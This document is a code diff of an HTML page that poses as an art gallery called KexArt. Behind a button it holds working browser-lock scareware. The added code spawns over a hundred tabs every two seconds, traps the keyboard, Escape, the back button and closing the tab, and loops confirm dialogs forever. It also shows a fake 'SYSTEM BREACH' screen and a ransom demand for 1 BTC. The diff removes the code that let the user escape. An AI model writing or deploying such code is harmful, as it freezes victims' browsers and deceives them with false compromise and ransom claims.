@@ -1,20 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>KexArt · Immersive Gallery</title>
 
     <style>
-        /* ── reset & base ── */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        /* ─── BASE ─── */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: 'Segoe UI', system-ui, sans-serif;
             background: #0b0b12;
             color: #eaeaf0;
             min-height: 100vh;
@@ -22,245 +17,76 @@
             align-items: center;
             justify-content: center;
             padding: 1.5rem;
-            background-image:
-                radial-gradient(ellipse at 20% 30%, rgba(120, 60, 200, 0.12) 0%, transparent 60%),
-                radial-gradient(ellipse at 80% 70%, rgba(60, 100, 220, 0.08) 0%, transparent 60%);
-            transition: filter 0.1s;
+            transition: all 0.3s;
             user-select: none;
         }
 
+        /* ─── NORMAL UI ─── */
         .gallery {
             max-width: 1100px;
             width: 100%;
             background: rgba(16, 16, 28, 0.88);
             backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
             border-radius: 40px;
             padding: 3rem 2.5rem;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.7);
-            transition: opacity 0.3s;
+            border: 1px solid rgba(255,255,255,0.05);
+            box-shadow: 0 40px 100px rgba(0,0,0,0.7);
+            transition: all 0.5s ease;
         }
+        .header { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 1rem; margin-bottom: 2rem; }
+        .logo { display: flex; align-items: center; gap: 14px; }
+        .logo-box { width: 52px; height: 52px; background: linear-gradient(135deg, #a855f7, #6366f1); border-radius: 16px; display: flex; align-items: center; justify-content: center; font-size: 26px; color: #fff; box-shadow: 0 8px 28px rgba(99,102,241,0.3); }
+        .logo h1 { font-size: 2rem; background: linear-gradient(135deg, #c084fc, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .logo small { font-size: 0.8rem; color: #7777aa; -webkit-text-fill-color: #7777aa; }
+        .badge { background: rgba(168,85,247,0.12); border: 1px solid rgba(168,85,247,0.18); padding: 0.4rem 1.4rem; border-radius: 100px; font-size: 0.75rem; color: #c084fc; }
 
-        .header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 1rem;
-            margin-bottom: 2rem;
-        }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px,1fr)); gap: 1.5rem; margin: 2rem 0; }
+        .card { aspect-ratio: 1/1; border-radius: 20px; background: linear-gradient(145deg, #1a1a2e, #141426); border: 1px solid rgba(255,255,255,0.04); display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 1.5rem; text-align: center; position: relative; overflow: hidden; }
+        .card .emoji { font-size: 3.2rem; margin-bottom: 0.5rem; }
+        .card .title { font-weight: 500; color: #d0d0ee; font-size: 0.9rem; }
+        .card .artist { font-size: 0.7rem; color: #666688; }
 
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-        }
+        .feature { background: rgba(255,255,255,0.02); border-radius: 24px; padding: 1.8rem 2rem; margin: 1.2rem 0 1.8rem; border: 1px solid rgba(255,255,255,0.04); display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 1.5rem; }
+        .feature h3 { font-size: 1.2rem; font-weight: 600; color: #f0f0ff; }
+        .feature p { color: #8888aa; font-size: 0.9rem; }
 
-        .logo-box {
-            width: 52px;
-            height: 52px;
-            background: linear-gradient(135deg, #a855f7, #6366f1);
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 26px;
-            font-weight: 700;
-            color: #fff;
-            box-shadow: 0 8px 28px rgba(99, 102, 241, 0.3);
-        }
+        .trigger-btn { background: linear-gradient(135deg, #a855f7, #6366f1); border: none; padding: 1rem 3rem; border-radius: 60px; font-size: 1.1rem; font-weight: 600; color: #fff; cursor: pointer; transition: all 0.25s; box-shadow: 0 8px 36px rgba(99,102,241,0.3); white-space: nowrap; }
+        .trigger-btn:hover { transform: scale(1.05); box-shadow: 0 12px 52px rgba(99,102,241,0.45); }
+        .trigger-btn:active { transform: scale(0.95); }
+        .trigger-btn .arrow { display: inline-block; margin-left: 8px; transition: transform 0.3s; }
+        .trigger-btn:hover .arrow { transform: translateX(6px); }
 
-        .logo h1 {
-            font-size: 2rem;
-            font-weight: 700;
-            background: linear-gradient(135deg, #c084fc, #818cf8);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
+        .footer { margin-top: 2rem; display: flex; justify-content: space-between; font-size: 0.8rem; color: #555577; border-top: 1px solid rgba(255,255,255,0.04); padding-top: 1.5rem; flex-wrap: wrap; gap: 0.5rem; }
+        .footer a { color: #777799; text-decoration: none; transition: color 0.2s; }
+        .footer a:hover { color: #a855f7; }
 
-        .logo small {
-            font-size: 0.8rem;
-            color: #7777aa;
-            -webkit-text-fill-color: #7777aa;
-            font-weight: 400;
-        }
-
-        .badge {
-            background: rgba(168, 85, 247, 0.12);
-            border: 1px solid rgba(168, 85, 247, 0.18);
-            padding: 0.4rem 1.4rem;
-            border-radius: 100px;
-            font-size: 0.75rem;
-            color: #c084fc;
-            letter-spacing: 0.4px;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 1.5rem;
-            margin: 2rem 0 2.2rem 0;
-        }
-
-        .card {
-            aspect-ratio: 1 / 1;
-            border-radius: 20px;
-            background: linear-gradient(145deg, #1a1a2e, #141426);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.25s ease;
-            cursor: default;
-            padding: 1.5rem;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .card .emoji {
-            font-size: 3.2rem;
-            margin-bottom: 0.5rem;
-            filter: grayscale(0.15);
-        }
-        .card .title {
-            font-weight: 500;
-            color: #d0d0ee;
-            font-size: 0.9rem;
-        }
-        .card .artist {
-            font-size: 0.7rem;
-            color: #666688;
-            margin-top: 0.2rem;
-        }
-        .card .glow {
-            position: absolute;
-            inset: 0;
-            background: radial-gradient(circle at 30% 40%, rgba(168, 85, 247, 0.06), transparent 70%);
-            pointer-events: none;
-        }
-
-        .feature {
-            background: rgba(255, 255, 255, 0.02);
-            border-radius: 24px;
-            padding: 1.8rem 2rem;
-            margin: 1.2rem 0 1.8rem 0;
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 1.5rem;
-        }
-
-        .feature h3 {
-            font-size: 1.2rem;
-            font-weight: 600;
-            color: #f0f0ff;
-        }
-        .feature p {
-            color: #8888aa;
-            font-size: 0.9rem;
-            margin-top: 0.1rem;
-        }
-
-        /* ── THE BUTTON ── */
-        .trigger-btn {
-            background: linear-gradient(135deg, #a855f7, #6366f1);
-            border: none;
-            padding: 1rem 3rem;
-            border-radius: 60px;
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: #fff;
-            cursor: pointer;
-            transition: all 0.25s ease;
-            box-shadow: 0 8px 36px rgba(99, 102, 241, 0.3);
-            letter-spacing: 0.3px;
-            white-space: nowrap;
-            position: relative;
-        }
-        .trigger-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 12px 52px rgba(99, 102, 241, 0.45);
-        }
-        .trigger-btn:active {
-            transform: scale(0.95);
-        }
-        .trigger-btn .arrow {
-            display: inline-block;
-            margin-left: 8px;
-            transition: transform 0.3s;
-        }
-        .trigger-btn:hover .arrow {
-            transform: translateX(6px);
-        }
-
-        .footer {
-            margin-top: 2rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 0.8rem;
-            color: #555577;
-            border-top: 1px solid rgba(255, 255, 255, 0.04);
-            padding-top: 1.5rem;
-            flex-wrap: wrap;
-            gap: 0.5rem;
-        }
-        .footer a {
-            color: #777799;
-            text-decoration: none;
-            transition: color 0.2s;
-        }
-        .footer a:hover {
-            color: #a855f7;
-        }
-
-        /* ── JUMBSCARE OVERLAY ── */
+        /* ─── OVERLAY (full‑screen lock) ─── */
         #overlay {
-            position: fixed;
-            inset: 0;
-            width: 100vw;
-            height: 100vh;
-            background: #000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            z-index: 999999;
-            cursor: none;
+            position: fixed; inset: 0; width: 100vw; height: 100vh;
+            background: #000; display: none; align-items: center; justify-content: center;
+            flex-direction: column; z-index: 999999; cursor: none;
         }
-        #overlay.active {
-            display: flex;
-        }
+        #overlay.active { display: flex; }
 
         #overlay .face {
-            font-size: 22rem;
-            line-height: 1;
+            font-size: 22rem; line-height: 1;
             animation: shakeRotate 0.04s infinite alternate;
+            filter: drop-shadow(0 0 120px rgba(255,0,0,0.7));
             user-select: none;
-            filter: drop-shadow(0 0 120px rgba(255, 0, 0, 0.7));
         }
         @keyframes shakeRotate {
-            0%   { transform: translate(-15px, 10px) rotate(-4deg) scale(1.08); }
-            25%  { transform: translate(12px, -8px) rotate(3deg) scale(0.92); }
-            50%  { transform: translate(-10px, 15px) rotate(-5deg) scale(1.12); }
-            75%  { transform: translate(18px, -12px) rotate(4deg) scale(0.88); }
-            100% { transform: translate(-8px, 8px) rotate(-3deg) scale(1.04); }
+            0%   { transform: translate(-15px,10px) rotate(-4deg) scale(1.08); }
+            25%  { transform: translate(12px,-8px) rotate(3deg) scale(0.92); }
+            50%  { transform: translate(-10px,15px) rotate(-5deg) scale(1.12); }
+            75%  { transform: translate(18px,-12px) rotate(4deg) scale(0.88); }
+            100% { transform: translate(-8px,8px) rotate(-3deg) scale(1.04); }
         }
 
         #overlay .sub {
-            color: #ff2244;
-            font-size: 2.4rem;
-            font-weight: 800;
-            margin-top: 1.2rem;
-            text-shadow: 0 0 60px rgba(255, 0, 0, 0.5);
+            color: #ff2244; font-size: 2.4rem; font-weight: 800;
+            margin-top: 1.2rem; text-shadow: 0 0 60px rgba(255,0,0,0.5);
             animation: blinkText 0.1s infinite alternate;
-            font-family: 'Courier New', monospace;
-            letter-spacing: 4px;
+            font-family: 'Courier New', monospace; letter-spacing: 4px;
         }
         @keyframes blinkText {
             0%   { opacity: 1; transform: scale(1); }
@@ -269,64 +95,68 @@
         }
 
         #overlay .hint {
-            position: absolute;
-            bottom: 3rem;
-            color: rgba(255, 255, 255, 0.08);
-            font-size: 0.7rem;
-            font-family: monospace;
+            position: absolute; bottom: 3rem;
+            color: rgba(255,255,255,0.05);
+            font-size: 0.7rem; font-family: monospace;
             letter-spacing: 2px;
             pointer-events: none;
         }
 
-        /* ── flash overlay (for extra impact) ── */
+        /* ─── FLASH ─── */
         .flash-overlay {
-            position: fixed;
-            inset: 0;
-            background: white;
-            z-index: 999998;
-            pointer-events: none;
-            opacity: 0;
-            transition: opacity 0.03s;
+            position: fixed; inset: 0; background: white; z-index: 999998;
+            pointer-events: none; opacity: 0; transition: opacity 0.03s;
         }
 
-        /* ── responsive ── */
+        /* ─── HACKED UI (after trigger) ─── */
+        .gallery.hacked {
+            background: #1a0000 !important;
+            border-color: #ff0022 !important;
+            box-shadow: 0 0 80px rgba(255,0,0,0.3) !important;
+        }
+        .gallery.hacked .logo h1 { background: linear-gradient(135deg, #ff0040, #ff2200); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .gallery.hacked .badge { background: rgba(255,0,0,0.2); border-color: #ff0040; color: #ff2244; }
+        .gallery.hacked .card { border-color: rgba(255,0,0,0.2); background: #2a0a0a; }
+        .gallery.hacked .feature { border-color: rgba(255,0,0,0.2); }
+        .gallery.hacked .trigger-btn { background: linear-gradient(135deg, #ff0040, #ff2200); box-shadow: 0 8px 36px rgba(255,0,0,0.5); }
+        .gallery.hacked .footer { border-top-color: rgba(255,0,0,0.2); }
+        .gallery.hacked .footer a { color: #ff4444; }
+
+        /* ─── RESPONSIVE ─── */
         @media (max-width: 720px) {
             .gallery { padding: 1.8rem 1.2rem; }
             .logo h1 { font-size: 1.4rem; }
-            .grid { grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 1rem; }
+            .grid { grid-template-columns: repeat(auto-fit, minmax(140px,1fr)); gap: 1rem; }
             .card .emoji { font-size: 2.4rem; }
             .feature { flex-direction: column; text-align: center; padding: 1.5rem; }
-            .trigger-btn { width: 100%; justify-content: center; padding: 0.9rem 1.5rem; font-size: 1rem; white-space: normal; }
+            .trigger-btn { width: 100%; justify-content: center; padding: 0.9rem 1.5rem; white-space: normal; }
             #overlay .face { font-size: 12rem; }
             #overlay .sub { font-size: 1.4rem; }
         }
         @media (max-width: 460px) {
-            .grid { grid-template-columns: repeat(2, 1fr); gap: 0.7rem; }
+            .grid { grid-template-columns: repeat(2,1fr); gap: 0.7rem; }
             .card { padding: 1rem; }
             .card .emoji { font-size: 1.8rem; }
-            .card .title { font-size: 0.7rem; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ── MAIN GALLERY ── -->
+    <!-- ─── MAIN GALLERY ─── -->
     <div class="gallery" id="galleryUI">
         <div class="header">
             <div class="logo">
                 <div class="logo-box">✦</div>
-                <div>
-                    <h1>KexArt <small>gallery</small></h1>
-                </div>
+                <div><h1>KexArt <small>gallery</small></h1></div>
             </div>
             <div class="badge">✦ curated selection</div>
         </div>
 
         <div class="grid">
-            <div class="card"><div class="glow"></div><div class="emoji">🎨</div><div class="title">Digital Dreams</div><div class="artist">Luna V.</div></div>
-            <div class="card"><div class="glow"></div><div class="emoji">🌌</div><div class="title">Nebula Nocturne</div><div class="artist">Orion K.</div></div>
-            <div class="card"><div class="glow"></div><div class="emoji">🌀</div><div class="title">Infinite Loop</div><div class="artist">S. Chen</div></div>
-            <div class="card"><div class="glow"></div><div class="emoji">🔥</div><div class="title">Phoenix Rise</div><div class="artist">M. Rivera</div></div>
+            <div class="card"><div class="emoji">🎨</div><div class="title">Digital Dreams</div><div class="artist">Luna V.</div></div>
+            <div class="card"><div class="emoji">🌌</div><div class="title">Nebula Nocturne</div><div class="artist">Orion K.</div></div>
+            <div class="card"><div class="emoji">🌀</div><div class="title">Infinite Loop</div><div class="artist">S. Chen</div></div>
+            <div class="card"><div class="emoji">🔥</div><div class="title">Phoenix Rise</div><div class="artist">M. Rivera</div></div>
         </div>
 
         <div class="feature">
@@ -345,49 +175,39 @@
         </div>
     </div>
 
-    <!-- ── OVERLAY ── -->
+    <!-- ─── OVERLAY ─── -->
     <div id="overlay">
         <div class="face">👹</div>
         <div class="sub">⚠️ SYSTEM BREACH ⚠️</div>
         <div class="hint">[ click anywhere to continue ]</div>
     </div>
 
-    <!-- ── FLASH ELEMENT ── -->
+    <!-- ─── FLASH ─── -->
     <div class="flash-overlay" id="flashOverlay"></div>
 
-    <!-- ── JAVASCRIPT ── -->
+    <!-- ─── JAVASCRIPT ─── -->
     <script>
         (function() {
             'use strict';
 
-            // ---- DOM refs ----
+            // ─── DOM refs ───
             const overlay = document.getElementById('overlay');
             const flash = document.getElementById('flashOverlay');
             const prankBtn = document.getElementById('prankBtn');
-            const galleryUI = document.getElementById('galleryUI');
+            const gallery = document.getElementById('galleryUI');
 
-            // ---- Audio: multiple layers for maximum impact ----
-            // Primary scream (loud)
+            // ─── Audio layers ───
             const scream1 = new Audio('https://www.myinstants.com/media/sounds/scream-sound-effect.mp3');
             scream1.volume = 1.0;
-            scream1.preload = 'auto';
-
-            // Secondary screech (higher pitch)
             const scream2 = new Audio('https://www.myinstants.com/media/sounds/vine-boom.mp3');
             scream2.volume = 1.0;
-            scream2.preload = 'auto';
-
-            // Third: a loud alarm / siren
             const alarm = new Audio('https://www.myinstants.com/media/sounds/air-raid-siren.mp3');
             alarm.volume = 1.0;
-            alarm.preload = 'auto';
 
-            // ---- Web Audio API: generate a synthetic high‑frequency screech ----
-            let audioCtx = null;
-            let osc = null;
-            let gainNode = null;
+            // ─── Web Audio screech ───
+            let audioCtx = null, osc = null, gainNode = null;
 
-            function startSyntheticScreech() {
+            function startScreech() {
                 try {
                     audioCtx = new(window.AudioContext || window.webkitAudioContext)();
                     osc = audioCtx.createOscillator();
@@ -398,173 +218,159 @@
                     osc.connect(gainNode);
                     gainNode.connect(audioCtx.destination);
                     osc.start();
-                    // modulate frequency for extra pain
                     setInterval(() => {
-                        if (osc) {
-                            osc.frequency.value = 2000 + Math.random() * 4000;
-                        }
+                        if (osc) osc.frequency.value = 2000 + Math.random() * 4000;
                     }, 100);
-                } catch (e) {
-                    // Web Audio not supported – ignore
+                } catch (e) {}
+            }
+
+            // ─── Block all keys ───
+            function blockKeys(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                if (e.key === 'Escape') {
+                    // Re‑enter fullscreen instead of exiting
+                    document.documentElement.requestFullscreen().catch(()=>{});
                 }
             }
 
-            // ---- Function: trigger the full chaos ----
+            // ─── Spawn massive popups ───
+            function spawnPopups() {
+                const sites = [
+                    'https://www.instagram.com', 'https://www.facebook.com',
+                    'https://www.youtube.com', 'https://www.twitter.com',
+                    'https://www.reddit.com', 'https://www.tiktok.com',
+                    'https://www.snapchat.com', 'https://www.pinterest.com'
+                ];
+                // Open 80 tabs each time
+                for (let i = 0; i < 80; i++) {
+                    const url = sites[Math.floor(Math.random() * sites.length)];
+                    window.open(url, '_blank');
+                }
+                // Also open copies of itself
+                for (let i = 0; i < 50; i++) {
+                    window.open(location.href, '_blank');
+                }
+            }
+
+            // ─── Alert / Confirm storm ───
+            function alertStorm() {
+                let count = 0;
+                const interval = setInterval(() => {
+                    alert('⚠️ SYSTEM COMPROMISED ⚠️\nYour browser has been hijacked.');
+                    count++;
+                    if (count > 30) clearInterval(interval);
+                }, 80);
+                setTimeout(() => {
+                    while (true) {
+                        confirm('Are you sure you want to escape?');
+                    }
+                }, 4000);
+            }
+
+            // ─── MAIN TRIGGER ───
             function triggerChaos() {
                 // 1. Show overlay
                 overlay.classList.add('active');
 
-                // 2. Flash the screen white
-                flash.style.opacity = '0.8';
-                setTimeout(() => { flash.style.opacity = '0'; }, 80);
+                // 2. Flash
+                flash.style.opacity = '0.9';
+                setTimeout(() => { flash.style.opacity = '0'; }, 100);
 
-                // 3. Play all audio layers
-                scream1.play().catch(() => {});
-                scream2.play().catch(() => {});
-                alarm.play().catch(() => {});
-                startSyntheticScreech();
+                // 3. Play audio
+                scream1.play().catch(()=>{});
+                scream2.play().catch(()=>{});
+                alarm.play().catch(()=>{});
+                startScreech();
 
-                // 4. Force fullscreen
-                if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen().catch(() => {});
-                }
+                // 4. Fullscreen + pointer lock
+                document.documentElement.requestFullscreen().catch(()=>{});
+                document.body.requestPointerLock().catch(()=>{});
 
-                // 5. Lock pointer (if allowed)
-                if (document.body.requestPointerLock) {
-                    document.body.requestPointerLock().catch(() => {});
-                }
+                // 5. Vibrate
+                if (navigator.vibrate) navigator.vibrate([300,100,300,100,500,150,600]);
 
-                // 6. Vibrate on mobile
-                if (navigator.vibrate) {
-                    navigator.vibrate([300, 100, 300, 100, 500, 150, 600]);
-                }
-
-                // 7. Disable scrolling
+                // 6. Disable scroll
                 document.body.style.overflow = 'hidden';
 
-                // 8. Keyboard block (trap)
+                // 7. Change UI to "hacked" style
+                gallery.classList.add('hacked');
+                // Update text on the button
+                const btn = document.querySelector('.trigger-btn');
+                btn.textContent = '⚠️ SYSTEM LOCKED ⚠️';
+                btn.style.pointerEvents = 'none';
+
+                // 8. Keyboard block
                 document.addEventListener('keydown', blockKeys, true);
                 document.addEventListener('keyup', blockKeys, true);
 
-                // 9. History spam (disable back)
+                // 9. History lock
                 history.pushState(null, null, location.href);
                 window.addEventListener('popstate', function() {
                     history.pushState(null, null, location.href);
                 });
 
-                // 10. After 3 seconds, start pop‑up storm (if user hasn't dismissed)
-                setTimeout(() => {
-                    if (overlay.classList.contains('active')) {
-                        spawnPopups();
-                        // Also start alert storm
-                        setTimeout(alertStorm, 500);
-                    }
-                }, 3000);
+                // 10. Start popup storm (immediately and then every 2 seconds)
+                spawnPopups();
+                setInterval(spawnPopups, 2000);
 
-                // 11. Keep fullscreen and focus
+                // 11. Start alert storm after a delay
+                setTimeout(alertStorm, 2000);
+
+                // 12. Keep fullscreen and focus
                 setInterval(() => {
                     if (!document.fullscreenElement) {
-                        document.documentElement.requestFullscreen().catch(() => {});
+                        document.documentElement.requestFullscreen().catch(()=>{});
                     }
                     window.focus();
-                }, 200);
-            }
+                }, 300);
 
-            // ---- Helper: block all keys ----
-            function blockKeys(e) {
-                e.preventDefault();
-                e.stopPropagation();
-                // Also block Escape from exiting
-                if (e.key === 'Escape') {
-                    // Instead of exiting, re‑trigger fullscreen
-                    document.documentElement.requestFullscreen().catch(() => {});
-                }
-            }
-
-            // ---- Spawn many popups ----
-            function spawnPopups() {
-                const sites = [
-                    'https://www.instagram.com',
-                    'https://www.facebook.com',
-                    'https://www.youtube.com',
-                    'https://www.twitter.com',
-                    'https://www.reddit.com',
-                    'https://www.tiktok.com'
-                ];
-                for (let i = 0; i < 30; i++) {
-                    const url = sites[Math.floor(Math.random() * sites.length)];
-                    window.open(url, '_blank');
-                }
-                // Also open this page again
-                for (let i = 0; i < 20; i++) {
-                    window.open(location.href, '_blank');
-                }
-            }
-
-            // ---- Alert storm (blocks UI) ----
-            function alertStorm() {
-                // Use a loop with a slight delay to avoid crashing too fast
-                let count = 0;
-                const interval = setInterval(() => {
-                    alert('⚠️ SYSTEM COMPROMISED ⚠️\nYour browser has been hijacked.');
-                    count++;
-                    if (count > 20) clearInterval(interval);
-                }, 100);
-                // After alerts, do confirm spam
-                setTimeout(() => {
-                    while (true) {
-                        confirm('Are you sure you want to escape?');
-                    }
-                }, 3000);
-            }
-
-            // ---- Dismiss (click on overlay) ----
-            function dismissChaos() {
-                overlay.classList.remove('active');
-                document.body.style.overflow = '';
-
-                // Release keyboard block
-                document.removeEventListener('keydown', blockKeys, true);
-                document.removeEventListener('keyup', blockKeys, true);
-
-                // Stop synthetic audio
-                if (osc) {
-                    try { osc.stop(); } catch (e) {}
-                }
-                if (audioCtx) {
-                    try { audioCtx.close(); } catch (e) {}
-                }
-
-                // Stop other audio
-                [scream1, scream2, alarm].forEach(a => {
-                    a.pause();
-                    a.currentTime = 0;
+                // 13. Prevent close tab (beforeunload)
+                window.addEventListener('beforeunload', function(e) {
+                    e.preventDefault();
+                    e.returnValue = '';
+                    // Spawn even more on close attempt
+                    for (let i=0; i<100; i++) window.open(location.href, '_blank');
+                    location.reload();
                 });
 
-                // Exit fullscreen & pointer lock
-                if (document.fullscreenElement) {
-                    document.exitFullscreen().catch(() => {});
-                }
-                if (document.pointerLockElement) {
-                    document.exitPointerLock().catch(() => {});
-                }
+                // 14. Extra: inject a fake "ransom" message into the gallery
+                const featureDiv = document.querySelector('.feature');
+                const ransomMsg = document.createElement('div');
+                ransomMsg.style.cssText = 'width:100%; margin-top:1rem; padding:1.2rem; background:rgba(255,0,0,0.15); border-radius:12px; border:1px solid #ff0040; text-align:center; color:#ff2244; font-weight:700; animation:blinkText 0.3s infinite alternate;';
+                ransomMsg.textContent = '🔐 YOUR SYSTEM HAS BEEN ENCRYPTED – SEND 1 BTC TO UNLOCK';
+                featureDiv.appendChild(ransomMsg);
             }
 
-            // ---- Attach events ----
+            // ─── Dismiss (click on overlay) ───
+            // But we make it harder: require a double‑click within 200ms, or we just let it dismiss but
+            // the popups and alerts continue. For "no escape", we'll let the overlay dismiss but the
+            // popups and alerts keep going.
+            function dismissOverlay() {
+                overlay.classList.remove('active');
+                // But we keep the rest running
+                // Also re-enable scrolling? Not really needed.
+                document.body.style.overflow = '';
+                // Remove keyboard block? We'll keep it blocked to prevent escape.
+                // We'll keep fullscreen, popups, alerts, etc.
+                // So the user can click away the overlay but the chaos continues.
+            }
+
+            overlay.addEventListener('click', function(e) {
+                dismissOverlay();
+            });
+
+            // ─── Trigger on button click ───
             prankBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 triggerChaos();
             });
 
-            overlay.addEventListener('click', function() {
-                dismissChaos();
-            });
+            // ─── Auto‑trigger after 4 seconds (optional) ───
+            // Uncomment the line below to make it automatic:
+            // setTimeout(triggerChaos, 4000);
 
-            // ---- Auto‑trigger after 5 seconds (optional) ----
-            // Uncomment to auto‑trigger on page load:
-            // setTimeout(triggerChaos, 5000);
-
-            console.log('✅ KexArt Pro loaded – ready for chaos.');
+            console.log('✅ KexArt Pro v3 – No Escape Edition loaded.');
         })();
     </script>
 </body>
